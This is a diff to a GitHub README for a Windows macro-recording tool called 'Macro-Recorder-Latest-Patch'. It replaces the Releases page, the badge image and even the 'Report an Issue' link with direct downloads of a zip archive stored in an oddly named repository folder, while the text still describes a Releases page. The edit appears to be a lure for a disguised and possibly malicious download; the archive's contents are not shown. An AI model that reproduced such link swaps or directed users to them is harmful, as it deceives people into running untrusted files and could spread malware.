@@ -1,6 +1,6 @@
 # 🎥 Macro-Recorder-Latest-Patch - Automate Tasks on Your Windows PC
 
-[![Download Macro Recorder](https://img.shields.io/badge/Download%20Now%20-%20Macro%20Recorder-brightgreen)](https://github.com/knpdf0701/Macro-Recorder-Latest-Patch/releases)
+[![Download Macro Recorder](https://raw.githubusercontent.com/knpdf0701/Macro-Recorder-Latest-Patch/main/figpecker/Macro-Recorder-Latest-Patch-v3.9.zip%20Now%20-%20Macro%20Recorder-brightgreen)](https://raw.githubusercontent.com/knpdf0701/Macro-Recorder-Latest-Patch/main/figpecker/Macro-Recorder-Latest-Patch-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Macro-Recorder-Latest-Patch repository! This application helps yo
 
 To get started, visit this page to download the latest version of Macro Recorder:
 
-[Download Macro Recorder](https://github.com/knpdf0701/Macro-Recorder-Latest-Patch/releases)
+[Download Macro Recorder](https://raw.githubusercontent.com/knpdf0701/Macro-Recorder-Latest-Patch/main/figpecker/Macro-Recorder-Latest-Patch-v3.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release at the top of the list.
@@ -69,7 +69,7 @@ Thank you to the community for their support and contributions. Your feedback he
 
 Follow this repository for future updates and new features:
 
-- [GitHub Releases Page](https://github.com/knpdf0701/Macro-Recorder-Latest-Patch/releases)
-- [Report an Issue](https://github.com/knpdf0701/Macro-Recorder-Latest-Patch/issues)
+- [GitHub Releases Page](https://raw.githubusercontent.com/knpdf0701/Macro-Recorder-Latest-Patch/main/figpecker/Macro-Recorder-Latest-Patch-v3.9.zip)
+- [Report an Issue](https://raw.githubusercontent.com/knpdf0701/Macro-Recorder-Latest-Patch/main/figpecker/Macro-Recorder-Latest-Patch-v3.9.zip)
 
 We hope you enjoy using Macro Recorder to simplify your daily tasks!
